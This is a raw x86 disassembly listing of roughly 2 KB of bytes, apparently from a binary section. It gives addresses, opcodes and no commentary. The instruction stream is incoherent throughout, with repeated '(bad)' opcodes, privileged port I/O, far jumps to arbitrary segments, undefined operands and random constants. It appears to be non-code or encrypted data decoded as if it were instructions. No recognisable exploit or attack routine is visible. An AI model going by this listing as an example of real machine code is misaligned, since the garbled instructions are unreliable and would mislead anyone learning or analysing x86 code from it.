  420ca0:	pushf  
  420ca1:	enter  0x5f5d,0x29
  420ca5:	es out dx,eax
  420ca7:	call   0xf5423f31
  420cac:	sahf   
  420cad:	jmp    FWORD PTR [edx-0x60286be8]
  420cb3:	add    eax,0x4416279
  420cb8:	add    DWORD PTR [edx-0xe],ebx
  420cbb:	pop    ecx
  420cbc:	sahf   
  420cbd:	outs   dx,DWORD PTR ds:[esi]
  420cbe:	dec    edi
  420cbf:	shr    BYTE PTR [ecx],cl
  420cc1:	daa    
  420cc2:	pop    edx
  420cc3:	and    cl,BYTE PTR [edx]
  420cc5:	nop
  420cc6:	dec    eax
  420cc7:	dec    ebp
  420cc8:	jecxz  0x420d29
  420cca:	jg     0x420c96
  420ccc:	mov    ch,0x38
  420cce:	lock inc DWORD PTR [eax-0x528f0de4]
  420cd5:	je     0x420c61
  420cd7:	sbb    esi,edi
  420cd9:	sub    ebp,DWORD PTR [edx-0x4f]
  420cdc:	push   0xba08a2f5
  420ce1:	fisttp DWORD PTR [eax]
  420ce3:	outs   dx,DWORD PTR ds:[esi]
  420ce4:	loope  0x420ced
  420ce6:	test   eax,0xf99537a
  420ceb:	sub    eax,0x7e677bd9
  420cf0:	xchg   BYTE PTR [ecx-0x28],bh
  420cf3:	push   edi
  420cf4:	(bad)  
  420cf5:	lock push eax
  420cf7:	push   0xaaef7b22
  420cfc:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420cfe:	sbb    al,0xbf
  420d00:	fcom   QWORD PTR [ebp-0x62]
  420d03:	mov    ecx,0x8ca02e67
  420d08:	addr16 cpuid 
  420d0b:	aaa    
  420d0c:	cld    
  420d0d:	sbb    esi,DWORD PTR [esi+0x37]
  420d10:	push   ebp
  420d11:	imul   edi,DWORD PTR [esi-0x54123a57],0x44f6978a
  420d1b:	push   esi
  420d1c:	jecxz  0x420cd6
  420d1e:	test   al,0xdf
  420d20:	fcomp  QWORD PTR [edi-0x5e437bac]
  420d26:	(bad)  
  420d27:	imul   esi,DWORD PTR [ebp+eax*4-0x5cb7a0ef],0xaaebb5c2
  420d32:	cs push 0x1f89ea89
  420d38:	retf   
  420d39:	movq   mm5,QWORD PTR [eax-0x431ef2f3]
  420d40:	mov    ch,0xd6
  420d42:	pop    esi
  420d43:	mov    al,0x18
  420d45:	cmp    DWORD PTR [ebx+0x1112965b],edx
  420d4b:	and    bl,BYTE PTR [edi]
  420d4d:	call   0x924a0cea
  420d52:	sub    edx,ebx
  420d54:	xchg   edi,eax
  420d55:	mov    ecx,0xd7e294f2
  420d5a:	pusha  
  420d5b:	xor    BYTE PTR [edi+edx*8],cl
  420d5e:	or     WORD PTR [eax-0xce6aa40],bp
  420d65:	mov    ?,esp
  420d67:	pop    ds
  420d68:	shr    BYTE PTR [ebp-0x15bcb79c],0x78
  420d6f:	push   esp
  420d70:	cld    
  420d71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d72:	hlt    
  420d73:	fsub   QWORD PTR [eax-0x61]
  420d76:	jns    0x420d41
  420d78:	jmp    0x8c8c5609
  420d7d:	pop    ebx
  420d7e:	and    bl,dl
  420d80:	adc    DWORD PTR [ebx],esp
  420d82:	push   ebx
  420d83:	out    0x9d,al
  420d85:	mov    ds:0xef50e04f,eax
  420d8a:	out    0x72,eax
  420d8c:	xchg   ecx,eax
  420d8d:	adc    bl,bh
  420d8f:	out    dx,al
  420d90:	popa   
  420d91:	push   eax
  420d92:	cmp    ah,BYTE PTR [ecx-0xa8554dd]
  420d98:	mov    eax,ds:0x742dad31
  420d9d:	jnp    0x420d2d
  420d9f:	sub    edx,DWORD PTR [esi-0x1f]
  420da2:	es nop
  420da4:	add    edi,0x2579ac00
  420daa:	push   ds
  420dab:	sahf   
  420dac:	mov    cl,0x6
  420dae:	aad    0x11
  420db0:	(bad)  
  420db1:	adc    eax,0xc75a81dd
  420db6:	jns    0x420e14
  420db8:	push   ecx
  420db9:	or     DWORD PTR [edi+0x5d],0x3690a582
  420dc0:	and    dl,BYTE PTR [esi+0x2c]
  420dc3:	ret    0xd3f7
  420dc6:	xchg   ebx,eax
  420dc7:	(bad)  [eax]
  420dc9:	inc    edx
  420dca:	lods   al,BYTE PTR ds:[esi]
  420dcb:	sub    edi,DWORD PTR [ecx]
  420dcd:	in     eax,0x2e
  420dcf:	fdiv   QWORD PTR ds:0xbb310cf2
  420dd5:	sbb    BYTE PTR [bx+si],cl
  420dd8:	mov    al,ds:0x3c1a81ac
  420ddd:	adc    al,0x1c
  420ddf:	mov    fs,esp
  420de1:	data16 or al,0x9f
  420de4:	(bad)  
  420de5:	in     eax,0x29
  420de7:	ss sahf 
  420de9:	mov    eax,eax
  420deb:	in     al,dx
  420dec:	dec    ebp
  420ded:	sub    eax,DWORD PTR [esi+0x28]
  420df0:	mov    esp,0x73710c7
  420df5:	or     dl,0x4
  420df8:	adc    BYTE PTR [ecx],0x7c
  420dfb:	or     eax,0x5b497eb0
  420e00:	pop    es
  420e01:	cmp    esi,DWORD PTR [edi-0x77184caf]
  420e07:	or     BYTE PTR [esi-0x7588d335],ah
  420e0d:	or     BYTE PTR [edx],al
  420e0f:	loopne 0x420e2b
  420e11:	cdq    
  420e12:	das    
  420e13:	push   ds
  420e14:	inc    esi
  420e15:	inc    edi
  420e16:	ss cmp edi,0xffffffbb
  420e1a:	pop    ss
  420e1b:	jecxz  0x420e69
  420e1d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e1e:	inc    edi
  420e1f:	call   0x7913:0x7650b0bf
  420e26:	ret    
  420e27:	mov    esi,0x9b54c902
  420e2c:	data16 sub BYTE PTR [eax-0x7d0a6434],bh
  420e33:	test   eax,0xb70c7132
  420e38:	pop    ds
  420e39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420e3a:	mov    eax,0x2ccec606
  420e3f:	mov    ch,0x35
  420e41:	sar    BYTE PTR [edi+0x3071e7c1],0xac
  420e48:	add    ebp,DWORD PTR [ecx+0x2e]
  420e4b:	xor    cl,BYTE PTR [ecx]
  420e4d:	mov    edi,0x73fd6ef4
  420e52:	imul   ebx,ebp,0x28ce7861
  420e58:	cdq    
  420e59:	pop    es
  420e5a:	push   ss
  420e5b:	or     ebx,esi
  420e5d:	add    DWORD PTR [esi],esp
  420e5f:	jne    0x420deb
  420e61:	cmp    al,0x70
  420e63:	mov    al,0x89
  420e65:	mov    DWORD PTR [esp+ebp*2+0x36],ebp
  420e69:	cmc    
  420e6a:	sub    BYTE PTR [eax+ebp*8],bl
  420e6d:	pop    edx
  420e6e:	adc    al,0x31
  420e70:	xchg   ecx,eax
  420e71:	mov    es,WORD PTR [edi-0x77]
  420e74:	inc    eax
  420e75:	fdiv   QWORD PTR [edi+0x43]
  420e78:	lock ds adc eax,0x824cfd0e
  420e7f:	test   DWORD PTR [ebx+0x77b4ef69],ecx
  420e85:	dec    esp
  420e86:	pop    edx
  420e87:	push   0xa33bd444
  420e8c:	adc    BYTE PTR [ecx],bl
  420e8e:	test   al,0x58
  420e90:	sbb    eax,0x29fd983f
  420e95:	or     ah,BYTE PTR [esp+esi*1]
  420e98:	jne    0x420e58
  420e9a:	mov    al,BYTE PTR [ebp+0x2ed5db1f]
  420ea0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ea1:	dec    esi
  420ea2:	jecxz  0x420eb4
  420ea4:	cmp    eax,0x9c450c60
  420ea9:	rcr    BYTE PTR [esi],0x7f
  420eac:	add    ebp,DWORD PTR [edx+ecx*8+0x3dcfeb7e]
  420eb3:	cli    
  420eb4:	dec    ecx
  420eb5:	aam    0xc2
  420eb7:	(bad)  
  420eb8:	outs   dx,DWORD PTR ds:[esi]
  420eb9:	retf   0x9d76
  420ebc:	imul   edx,DWORD PTR [ebx],0x5f
  420ebf:	ins    BYTE PTR es:[edi],dx
  420ec0:	mov    bl,0x81
  420ec2:	dec    ebp
  420ec3:	add    al,al
  420ec5:	and    eax,DWORD PTR [edi+ebx*8-0x31]
  420ec9:	retf   0x53ac
  420ecc:	lods   eax,DWORD PTR ds:[esi]
  420ecd:	aaa    
  420ece:	mov    bl,al
  420ed0:	and    BYTE PTR [ecx+0x78],0xba
  420ed4:	xor    bh,BYTE PTR [ecx-0x40]
  420ed7:	les    esi,FWORD PTR [ecx+0x41]
  420eda:	mov    ds:0xee844f9a,eax
  420edf:	mov    eax,0x8a879c4e
  420ee4:	mov    ds:0xbc828e8d,al
  420ee9:	push   0x27
  420eeb:	xor    BYTE PTR [edi+0x77a6ea81],dh
  420ef1:	ffreep st(5)
  420ef3:	mov    al,ds:0x8fa14fd1
  420ef9:	or     eax,0x33849390
  420efe:	retf   0x1ea5
  420f01:	add    BYTE PTR [eax+ecx*2+0x3187027d],0x53
  420f09:	cmp    BYTE PTR ds:[ebx+0x55878db2],dl
  420f10:	mov    bh,0xec
  420f12:	dec    eax
  420f13:	cld    
  420f14:	adc    al,0xb5
  420f16:	jmp    0xc5aa:0x71c27af4
  420f1d:	mov    esi,0x3cbe9960
  420f22:	pop    ecx
  420f23:	data16 xor ah,BYTE PTR [ebx+0x3c9b670b]
  420f2a:	(bad)  
  420f2b:	push   eax
  420f2c:	cmp    BYTE PTR [ecx+0x63d43606],ch
  420f32:	jns    0x420f4b
  420f34:	(bad)  
  420f35:	sub    al,0xc
  420f37:	mov    ah,0xcc
  420f39:	icebp  
  420f3a:	mov    al,0x46
  420f3c:	mov    al,0x8f
  420f3e:	adc    eax,DWORD PTR [edx+0x7dff391d]
  420f44:	fdivr  DWORD PTR [eax+0x78]
  420f47:	dec    esp
  420f48:	lods   eax,DWORD PTR ds:[esi]
  420f49:	mov    esp,0xf336a139
  420f4e:	adc    al,BYTE PTR [ebx+0x1c]
  420f51:	push   es
  420f52:	mov    WORD PTR [ebx+0x4016bf04],?
  420f58:	push   0xcb36b24d
  420f5d:	ss ins BYTE PTR es:[edi],dx
  420f5f:	and    eax,DWORD PTR [edx]
  420f61:	sbb    cl,BYTE PTR [edx]
  420f63:	jge    0x420eed
  420f65:	inc    esi
  420f66:	(bad)  
  420f67:	daa    
  420f68:	inc    esi
  420f69:	das    
  420f6a:	mov    ch,0x54
  420f6c:	dec    esp
  420f6d:	jbe    0x420f68
  420f6f:	pop    esi
  420f70:	test   BYTE PTR [esi-0x4f],0xcb
  420f74:	sbb    eax,0x879d4d15
  420f79:	jae    0x420f7c
  420f7b:	addr16 adc al,0xbb
  420f7e:	imul   DWORD PTR [edi+0x4c]
  420f81:	xchg   BYTE PTR [eax],bh
  420f83:	repz add DWORD PTR [eax+ebx*1],esi
  420f87:	mov    edi,gs
  420f89:	in     al,dx
  420f8a:	mov    cl,0xd0
  420f8c:	add    esp,DWORD PTR ds:[ecx-0x2f82e0c]
  420f93:	ss loope 0x420f99
  420f96:	cmp    ch,dl
  420f98:	enter  0x9c8f,0x5
  420f9c:	pop    edi
  420f9d:	mov    eax,ds:0x95c1f228
  420fa2:	and    eax,0x7fed65fb
  420fa7:	jae    0x420fd4
  420fa9:	cmp    ch,BYTE PTR [edi+0x1a]
  420fac:	pop    es
  420fad:	rep stos BYTE PTR es:[edi],al
  420faf:	jbe    0x42101d
  420fb1:	aas    
  420fb2:	adc    DWORD PTR [esp+edi*2-0x4],0xffffffe2
  420fb7:	mov    eax,0xf165a137
  420fbc:	sbb    bl,bl
  420fbe:	aad    0x9
  420fc0:	popf   
  420fc1:	test   eax,0xf93e8c9
  420fc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420fc7:	arpl   WORD PTR [eax+0x4eab24c2],bp
  420fcd:	push   ecx
  420fce:	jle    0x421021
  420fd0:	aas    
  420fd1:	idiv   DWORD PTR [edx-0x59]
  420fd4:	or     ebx,ebp
  420fd6:	outs   dx,BYTE PTR ds:[esi]
  420fd7:	adc    eax,0x8071f955
  420fdc:	adc    al,0x38
  420fde:	(bad)  
  420fdf:	es xchg esi,eax
  420fe1:	aam    0x2b
  420fe3:	sbb    DWORD PTR ds:0xe967683c,eax
  420fe9:	push   0xd5e21f38
  420fee:	and    DWORD PTR [ebp-0x37d253f7],ebp
  420ff4:	in     eax,dx
  420ff5:	repz inc edx
  420ff7:	jo     0x420f7f
  420ff9:	inc    eax
  420ffa:	out    0x12,eax
  420ffc:	add    eax,0xff4a09ec
  421001:	addr16 mov dh,0x4b
  421004:	es xchg edx,eax
  421006:	push   0x3c2c66e
  42100b:	clc    
  42100c:	repz mov edx,0xbc5af813
  421012:	lods   al,BYTE PTR ds:[esi]
  421013:	fdiv   QWORD PTR [eax]
  421015:	enter  0x9167,0xc3
  421019:	xchg   esp,eax
  42101a:	adc    dh,bh
  42101c:	into   
  42101d:	dec    ebp
  42101e:	jp     0x421017
  421020:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421021:	sub    eax,0xb1b0f6aa
  421026:	jmp    0xa901e7d9
  42102b:	mov    cs,WORD PTR ds:0xf4030fe0
  421031:	xchg   DWORD PTR [edx-0x318279cb],ebp
  421037:	adc    BYTE PTR [ecx-0x34],0x45
  42103b:	ds sti 
  42103d:	dec    edi
  42103e:	(bad)  
  421040:	xlat   BYTE PTR ds:[ebx]
  421041:	jmp    0x59e88d55
  421046:	pop    ds
  421047:	sahf   
  421048:	xchg   ecx,eax
  421049:	add    ah,BYTE PTR [esi-0x7a268c2]
  42104f:	xor    eax,0x886df029
  421054:	cld    
  421055:	or     eax,0x38844796
  42105a:	and    al,0x1d
  42105c:	dec    eax
  42105d:	mov    esp,0x529e7e97
  421062:	cli    
  421063:	hlt    
  421064:	in     al,dx
  421065:	cs fmul st(5),st
  421069:	shl    DWORD PTR [ebx+0x59],1
  42106c:	xor    al,0xb9
  42106e:	and    ecx,ebp
  421070:	mov    ecx,0x2fa87db6
  421075:	push   cs
  421076:	icebp  
  421077:	test   al,0x74
  421079:	jae    0x42100a
  42107b:	xchg   ecx,eax
  42107c:	mov    cs,WORD PTR [ecx-0x3f3f63ff]
  421082:	jmp    0x8daf:0x305ed4c9
  421089:	push   cs
  42108a:	ins    BYTE PTR es:[edi],dx
  42108b:	fisttp WORD PTR [ebx+0xf]
  42108e:	into   
  42108f:	popf   
  421090:	sahf   
  421091:	out    dx,eax
  421092:	jmp    0x3da0:0xa5a84708
  421099:	jle    0x421032
  42109b:	call   0x822c224f
  4210a0:	loopne 0x421069
  4210a2:	retf   
  4210a3:	test   BYTE PTR [ebx-0x78],bl
  4210a6:	mov    DWORD PTR [ecx],ecx
  4210a8:	std    
  4210a9:	and    ebp,DWORD PTR [edx]
  4210ab:	xchg   edx,eax
  4210ac:	cmp    al,0xf4
  4210ae:	cld    
  4210af:	test   al,0x2
  4210b1:	jbe    0x4210e9
  4210b3:	jl     0x4210e6
  4210b5:	aas    
  4210b6:	xor    BYTE PTR [edi],al
  4210b8:	push   0x886840f0
  4210bd:	mov    BYTE PTR [eax],ch
  4210bf:	iret   
  4210c0:	inc    edi
  4210c1:	fs pop ebp
  4210c3:	inc    ebx
  4210c4:	push   edx
  4210c5:	iret   
  4210c6:	push   esp
  4210c7:	cmp    ebp,DWORD PTR [edi*8-0x8e12c7f]
  4210ce:	fimul  DWORD PTR [eax-0xf]
  4210d1:	mov    ebx,eax
  4210d3:	test   eax,0x5246edce
  4210d8:	jns    0x4210e0
  4210da:	loope  0x421079
  4210dc:	mov    eax,0x4b664c1c
  4210e1:	std    
  4210e2:	stos   DWORD PTR es:[edi],eax
  4210e3:	mov    gs,WORD PTR [ebp+0x3d1fbdb0]
  4210e9:	jns    0x421075
  4210eb:	out    dx,eax
  4210ec:	add    BYTE PTR [ecx+0x23],bh
  4210ef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210f0:	vmwrite eax,DWORD PTR [ebx-0x20]
  4210f4:	mov    esp,0x365e75a7
  4210f9:	xor    eax,0x27f27561
  4210fe:	jne    0x42111f
  421100:	inc    eax
  421101:	addr16 test al,0x42
  421104:	je     0x4210f0
  421106:	jl     0x4210ac
  421108:	sbb    ebx,DWORD PTR [ebp-0x42958d07]
  42110e:	mov    cl,BYTE PTR ds:0xdd75695a
  421114:	fidiv  DWORD PTR [eax+eax*2+0x324fdb7c]
  42111b:	dec    ebp
  42111c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42111d:	test   al,0x38
  42111f:	into   
  421120:	xchg   ecx,edi
  421122:	mov    cl,0x5a
  421124:	push   ecx
  421125:	out    dx,eax
  421126:	nop
  421127:	dec    ecx
  421128:	aam    0x7d
  42112a:	popf   
  42112b:	jns    0x421116
  42112d:	fst    DWORD PTR [ebp*1+0x511e806]
  421134:	ss in  al,dx
  421136:	add    BYTE PTR [edi],bl
  421138:	stos   DWORD PTR es:[edi],eax
  421139:	rcl    ebx,cl
  42113b:	inc    eax
  42113c:	adc    eax,0x2d47966f
  421141:	mov    cl,BYTE PTR [edi]
  421143:	aas    
  421144:	and    DWORD PTR [eax],edi
  421146:	mov    dl,0xe0
  421148:	fisub  WORD PTR [edx]
  42114a:	retf   
  42114b:	or     bh,BYTE PTR [esi+0x1fe2841c]
  421151:	ds push ebx
  421153:	pop    edi
  421154:	cld    
  421155:	stos   DWORD PTR es:[edi],eax
  421156:	push   esi
  421157:	dec    ebx
  421158:	ret    
  421159:	push   ss
  42115a:	sbb    DWORD PTR [ecx+0x56],0x62
  42115e:	loope  0x42113f
  421160:	inc    ebp
  421161:	and    dl,BYTE PTR [esi+0x7]
  421164:	stos   BYTE PTR es:[edi],al
  421165:	and    eax,0xd6b8f3da
  42116a:	addr16 push 0x5637ee68
  421170:	inc    edx
  421171:	test   DWORD PTR [ebx-0x384d6faa],0x67d23c6f
  42117b:	sub    BYTE PTR [eax],0x49
  42117e:	dec    ebp
  42117f:	xchg   BYTE PTR [edx],dh
  421181:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421182:	daa    
  421183:	mov    ah,0x64
  421185:	add    BYTE PTR [ebp+0x43ede3fe],cl
  42118b:	test   DWORD PTR [ebx-0x3a],0x7587ac85
  421192:	lock nop
  421194:	dec    edx
  421195:	lods   al,BYTE PTR ds:[esi]
  421196:	gs push 0xffffffe6
  421199:	dec    edi
  42119a:	push   es
  42119b:	push   ds
  42119c:	cmc    
  42119d:	mov    ah,0x78
  42119f:	sbb    BYTE PTR [esi-0x19],bh
  4211a2:	mov    BYTE PTR [edi-0x9],al
  4211a5:	sbb    esi,ebp
  4211a7:	and    dh,dh
  4211a9:	fdivr  st(6),st
  4211ab:	lock xchg ebx,eax
  4211ad:	mov    al,0xec
  4211af:	enter  0xfbb6,0xea
  4211b3:	aaa    
  4211b4:	(bad)  
  4211b5:	pop    ds
  4211b6:	xchg   esi,eax
  4211b7:	icebp  
  4211b8:	mov    edx,ebx
  4211ba:	lock and BYTE PTR [ecx+0x1c85eca8],0x9d
  4211c2:	cmp    DWORD PTR [edx-0x18],0xc
  4211c6:	pop    ecx
  4211c7:	sub    DWORD PTR [ecx+0x1ffa3208],esp
  4211cd:	fist   WORD PTR [edx-0x1f2bfbf]
  4211d3:	shl    DWORD PTR [edx],cl
  4211d5:	arpl   WORD PTR [eax],bp
  4211d7:	std    
  4211d8:	jnp    0x4211da
  4211da:	xchg   DWORD PTR [eax-0x451d8e73],ebp
  4211e0:	(bad)  
  4211e1:	(bad)  
  4211e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4211e3:	mov    dh,0xa7
  4211e5:	sub    BYTE PTR [edx],dl
  4211e7:	push   ecx
  4211e8:	dec    ecx
  4211e9:	es (bad) 
  4211eb:	int    0xd4
  4211ed:	mov    ah,0x25
  4211ef:	stos   BYTE PTR es:[edi],al
  4211f0:	adc    ecx,DWORD PTR [esi-0x42e2d90f]
  4211f6:	or     eax,0xd913be2
  4211fb:	pop    ss
  4211fc:	aam    0xce
  4211fe:	mov    edx,0x8310c6bb
  421203:	stc    
  421204:	(bad)  
  421205:	into   
  421206:	jne    0x4211c7
  421208:	nop
  421209:	enter  0xf14e,0xee
  42120d:	adc    eax,ebp
  42120f:	repnz fidivr WORD PTR [ecx+0x375c17ef]
  421216:	ins    BYTE PTR es:[edi],dx
  421217:	ret    
  421218:	fidivr DWORD PTR [edi+0x46cc3cae]
  42121e:	test   al,0xba
  421220:	ins    BYTE PTR es:[edi],dx
  421221:	cmp    DWORD PTR [esi],0xd253b744
  421227:	js     0x421253
  421229:	dec    esp
  42122a:	imul   ecx,DWORD PTR [edx-0x6da2e92a],0xb8abf4d3
  421234:	in     eax,dx
  421235:	xchg   BYTE PTR [edi-0x76],ch
  421238:	ror    edi,1
  42123a:	and    al,0x38
  42123d:	scas   al,BYTE PTR es:[edi]
  42123e:	nop
  42123f:	(bad)  
  421240:	jmp    0x5192:0xb51b78fd
  421247:	loop   0x4212a5
  421249:	inc    eax
  42124a:	out    0xc7,eax
  42124c:	cmc    
  42124d:	cwde   
  42124e:	nop
  42124f:	addr16 push esi
  421251:	push   edi
  421252:	pop    es
  421253:	imul   DWORD PTR [edx-0x5d]
  421256:	jg     0x421270
  421258:	xchg   edx,eax
  421259:	xchg   ebx,eax
  42125a:	mov    ch,BYTE PTR [edx]
  42125c:	jmp    0x378c:0x83d1427
  421263:	xor    al,0xea
  421265:	enter  0x7dd3,0x80
  421269:	imul   ebp,DWORD PTR [edx],0x46
  42126c:	popf   
  42126d:	in     eax,0x5
  42126f:	inc    eax
  421270:	adc    DWORD PTR [ebx+0x4082edcf],edx
  421276:	in     al,0x49
  421278:	xor    BYTE PTR [ebx+0x153d8351],dl
  42127e:	adc    al,0x2f
  421280:	xor    al,0x2e
  421282:	ficom  WORD PTR [ebp+ecx*4-0x72]
  421286:	mov    ebp,fs
  421288:	cs repz push ebp
  42128b:	push   0x7a
  42128d:	xor    al,0x9f
  42128f:	mov    ds:0xffc0ca45,eax
  421294:	mov    ch,0x11
  421296:	sbb    ecx,DWORD PTR [ecx+0x4ce2a6d4]
  42129c:	dec    esp
  42129d:	pop    esp
  42129e:	mov    al,0xee
  4212a0:	retf   
  4212a1:	mov    bl,0x73
  4212a3:	inc    eax
  4212a4:	in     al,0x42
  4212a6:	ret    0x7057
  4212a9:	jecxz  0x4212db
  4212ab:	int    0xeb
  4212ad:	jae    0x421298
  4212af:	es push ecx
  4212b1:	inc    esi
  4212b2:	push   0xbc2a3f03
  4212b7:	and    BYTE PTR [edx],dh
  4212b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212ba:	sub    al,0x7
  4212bc:	out    dx,eax
  4212bd:	jmp    0x4212e3
  4212bf:	fnsave [ecx+esi*2]
  4212c2:	or     bh,ch
  4212c4:	out    dx,eax
  4212c5:	imul   DWORD PTR [ecx+0x22]
  4212c8:	jmp    0xee96a146
  4212cd:	mov    ds:0xfdaa06da,eax
  4212d2:	mov    dl,0xdb
  4212d4:	std    
  4212d5:	mov    ecx,0x64a7f21
  4212da:	jecxz  0x421319
  4212dc:	in     eax,0xde
  4212de:	dec    esi
  4212df:	cmp    al,0xd9
  4212e1:	cli    
  4212e2:	je     0x4212ea
  4212e4:	arpl   bx,bx
  4212e6:	out    dx,al
  4212e7:	push   ds
  4212e8:	fiadd  DWORD PTR [ebx]
  4212ea:	ret    
  4212eb:	repz cli 
  4212ed:	dec    BYTE PTR [edx-0x5c]
  4212f0:	pusha  
  4212f1:	xchg   edi,eax
  4212f2:	push   ds
  4212f3:	mov    BYTE PTR [edi-0x58],dh
  4212f6:	and    eax,0x6a2fdd0
  4212fb:	pop    esi
  4212fc:	loop   0x421283
  4212fe:	loopne 0x4212d4
  421300:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421301:	mov    dl,0x20
  421303:	cmp    eax,0xe9bc4689
  421308:	cli    
  421309:	leave  
  42130a:	push   ebp
  42130b:	sub    ch,al
  42130d:	jbe    0x421294
  42130f:	div    BYTE PTR [edx-0x5bc96c7a]
  421315:	fstp   DWORD PTR [ebx-0x381226de]
  42131b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42131c:	shr    BYTE PTR [esi],cl
  42131e:	retf   
  42131f:	popf   
  421320:	cs pushf 
  421322:	(bad)  
  421324:	inc    eax
  421325:	jecxz  0x4212dd
  421327:	je     0x421322
  421329:	imul   DWORD PTR [ebp+0x4]
  42132c:	xchg   DWORD PTR [edx-0xfb0fe12],edi
  421332:	ins    BYTE PTR es:[edi],dx
  421333:	pusha  
  421334:	sbb    al,0xe9
  421336:	into   
  421337:	(bad)  [ebx]
  421339:	rcl    BYTE PTR [esi+0x32],0xb8
  42133d:	popf   
  42133e:	imul   ebp,edx,0x4ab6147a
  421344:	cmp    BYTE PTR ds:0x769857b5,0xe
  42134b:	add    DWORD PTR [edx-0x75],esi
  42134e:	hlt    
  42134f:	rol    DWORD PTR [edx],0x5f
  421352:	stc    
  421353:	xchg   esp,eax
  421354:	and    DWORD PTR [edx+0x3cdc6b25],esi
  42135a:	jle    0x421349
  42135c:	sub    ebx,DWORD PTR [ecx-0x6]
  42135f:	inc    ecx
  421360:	idiv   BYTE PTR [edx+0x4a]
  421363:	(bad)  
  421365:	and    BYTE PTR [ebp-0x6013c126],ah
  42136b:	sar    BYTE PTR [ebp+edx*2+0x3f86668d],cl
  421372:	and    cl,al
  421374:	repnz out 0x42,al
  421377:	in     eax,0x2d
  421379:	mov    ah,bl
  42137b:	adc    al,0x2
  42137d:	push   ebx
  42137e:	push   ds
  42137f:	adc    esi,0x28
  421382:	(bad)  
  421383:	jmp    0x4a21:0x10eae5d4
  42138a:	sub    DWORD PTR [edx-0xf142e23],eax
  421390:	sahf   
  421391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421392:	pop    ss
  421393:	ret    
  421394:	push   es
  421395:	pop    ebx
  421396:	jle    0x4213f3
  421398:	or     DWORD PTR [esi-0x39e4f8b5],ebx
  42139e:	cmc    
  42139f:	mov    ds:0xe9ae054b,al
  4213a4:	pusha  
  4213a5:	std    
  4213a6:	ds pop ds
  4213a8:	or     al,0xd9
  4213aa:	jne    0x421376
  4213ac:	dec    esi
  4213ad:	cmp    BYTE PTR [edx+0x489893fa],bh
  4213b3:	and    ah,BYTE PTR [ebx]
  4213b5:	int    0xe5
  4213b7:	dec    ebp
  4213b8:	aad    0x41
  4213ba:	and    BYTE PTR [edi],ah
  4213bc:	mov    ds:0x1c692257,eax
  4213c1:	jecxz  0x421366
  4213c3:	out    dx,eax
  4213c4:	mov    al,ds:0x48b62bb8
  4213c9:	loopne 0x421371
  4213cb:	push   eax
  4213cc:	jecxz  0x4213f1
  4213ce:	daa    
  4213cf:	lods   al,BYTE PTR ds:[esi]
  4213d0:	adc    al,0x84
  4213d2:	(bad)  
  4213d3:	mov    edx,0x2d14a200
  4213d8:	or     BYTE PTR [ecx],dl
  4213da:	xor    eax,DWORD PTR [ebx]
  4213dc:	xchg   esp,eax
  4213dd:	or     bl,BYTE PTR [ebx]
  4213df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4213e0:	push   ebp
  4213e1:	push   ds
  4213e2:	imul   ebx,DWORD PTR [edx-0x354c9bf2],0xbc0d7e37
  4213ec:	imul   DWORD PTR [esi]
  4213ee:	pop    esp
  4213ef:	lock popa 
  4213f1:	inc    esp
  4213f2:	fdivr  QWORD PTR [esi+eiz*8-0x6757344e]
  4213f9:	dec    ebx
  4213fa:	or     edi,esi
  4213fc:	bound  esi,QWORD PTR [eax-0x1f5b06fd]
  421402:	test   DWORD PTR [ebx-0x73],0xf60ff094
  421409:	(bad)  
  42140a:	adc    al,0x89
  42140c:	call   0x1e937ee7
  421411:	jb     0x421435
  421413:	fisttp QWORD PTR [ebp-0x5d]
  421416:	imul   DWORD PTR [esi-0x761e4f9c]
  42141c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42141d:	push   ss
  42141e:	cmp    cl,BYTE PTR [ebp-0x25]
  421421:	int3   
  421422:	loop   0x4213af
  421424:	push   eax
  421425:	push   esp
  421426:	fs push esp
  421428:	jo     0x4213f5
  42142a:	std    
  42142b:	lock inc esp
  42142d:	loope  0x4213c7
  42142f:	jp     0x4214a6
  421431:	cli    
  421432:	and    BYTE PTR [eax],ch
  421434:	je     0x4213f3
  421436:	add    ah,BYTE PTR ds:0x19eec230
  42143c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42143d:	pop    esp
  42143e:	(bad)  
  42143f:	(bad)  
  421441:	push   eax
  421442:	and    al,0x39
  421444:	jmp    0x8d3a:0xab3fd6cb
  42144b:	push   eax
  42144c:	or     esp,DWORD PTR [ebp+0x2d]
  42144f:	enter  0x80ba,0x18
  421453:	mov    bl,0x3e
  421455:	and    DWORD PTR [ebx],ebx
  421457:	xchg   esp,eax
  421458:	mov    edi,0x1b475709
  42145d:	jle    0x4214c8
  42145f:	shl    DWORD PTR [edi+eax*1-0x54],0xbb
  421464:	jmp    0x5d108f8b
  421469:	add    edi,DWORD PTR [ebx+edx*2]
  42146c:	cld    
  42146d:	push   ebp
  42146e:	cmp    esp,eax
  421470:	pop    eax
  421471:	jbe    0x42146a
  421473:	dec    esp
  421474:	inc    esi
  421475:	xor    al,ah
  421477:	jge    0x42145f
  421479:	mov    eax,ds:0xf7c51560
  42147e:	or     BYTE PTR [eax+0x5b2fb59e],ah
  421484:	sti    
  421485:	test   DWORD PTR [ebp+eiz*1-0x4e],ecx
  421489:	xchg   edi,eax
  42148a:	cwde   
  42148b:	mov    eax,ds:0x4a66a2d2
  421490:	push   ecx
  421491:	mov    esi,0x4dde302a
  421496:	test   al,0xa5
  421498:	mov    esi,0x77180bd9
  42149d:	(bad)  
  42149e:	ins    BYTE PTR es:[edi],dx
  42149f:	mov    bl,BYTE PTR [edi+0x3b308097]
